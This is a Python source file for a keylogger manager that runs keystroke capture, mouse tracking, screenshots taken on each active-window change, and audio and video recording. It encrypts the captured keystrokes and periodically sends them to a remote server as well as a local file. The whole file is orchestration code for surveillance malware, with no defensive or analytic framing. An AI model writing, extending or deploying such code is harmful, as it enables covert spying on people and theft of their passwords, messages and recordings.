import threading
import time
import logging
from keylogger_service import KeyloggerService
from file_writer import FileWriter
from network_writer import NetworkWriter
from encryptor import Encryptor
from mouse_tracker import MouseTracker
from screenshot_capture import ScreenshotCapture
from active_window_tracker import ActiveWindowTracker
from audio_recorder import AudioRecorder
from video_recorder import VideoRecorder

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    handlers=[
        logging.FileHandler("keylogger_manager.log"),
        logging.StreamHandler()
    ]
)

class KeyloggerManager:
    def __init__(self, machine_name="MyMachine", flush_interval=60, encryption_key="default", server_url=None):
        self.machine_name = machine_name
        self.flush_interval = flush_interval
        self.keylogger = KeyloggerService()
        self.mouse_tracker = MouseTracker()
        self.screenshotter = ScreenshotCapture()
        self.window_tracker = ActiveWindowTracker()
        self.audio_recorder = AudioRecorder(duration=10)
        self.video_recorder = VideoRecorder(duration=10)
        self.encryptor = Encryptor(encryption_key)
        self.writers = []
        if server_url:
            self.writers.append(NetworkWriter(server_url))
        self.writers.append(FileWriter())
        self._is_running = False
        self._flush_thread = None
        self._window_tracking_thread = None

    def start(self):
        logging.info("Starting Keylogger...")
        self.keylogger.start_logging()
        logging.info("Starting Mouse Tracking...")
        self.mouse_tracker.start_tracking()
        logging.info("Starting Active Window Tracking...")
        self._window_tracking_thread = threading.Thread(target=self._track_active_windows)
        self._window_tracking_thread.daemon = True
        self._window_tracking_thread.start()
        logging.info("Starting Log Flush Cycle...")
        self._is_running = True
        self._flush_thread = threading.Thread(target=self._flush_loop)
        self._flush_thread.daemon = True
        self._flush_thread.start()

    def stop(self):
        logging.info("Stopping Keylogger...")
        self.keylogger.stop_logging()
        logging.info("Stopping Mouse Tracking...")
        self.mouse_tracker.stop_tracking()
        logging.info("Stopping Active Window Tracking...")
        self._is_running = False
        if self._flush_thread:
            self._flush_thread.join()
        if self._window_tracking_thread:
            self._window_tracking_thread.join()
        logging.info("All tracking processes have been stopped.")

    def _flush_loop(self):
        while self._is_running:
            time.sleep(self.flush_interval)
            log_data = self.keylogger.flush_buffer()
            if log_data:
                encrypted_data = self.encryptor.encrypt(log_data)
                for writer in self.writers:
                    writer.send_data(encrypted_data, self.machine_name)
                logging.info("Log data flushed and stored successfully.")

    def _track_active_windows(self):
        last_window = None
        while self._is_running:
            active_window = self.window_tracker._get_active_window()
            if active_window != last_window:
                logging.info(f"Active window changed: {active_window}")
                self.screenshotter.take_screenshot()
                last_window = active_window
            time.sleep(2)

    def record_audio(self):
        logging.info("Starting Audio Recording...")
        self.audio_recorder.record_audio()
        logging.info("Audio recording completed.")

    def record_video(self):
        logging.info("Starting Video Recording...")
        self.video_recorder.record_video()
        logging.info("Video recording completed.")
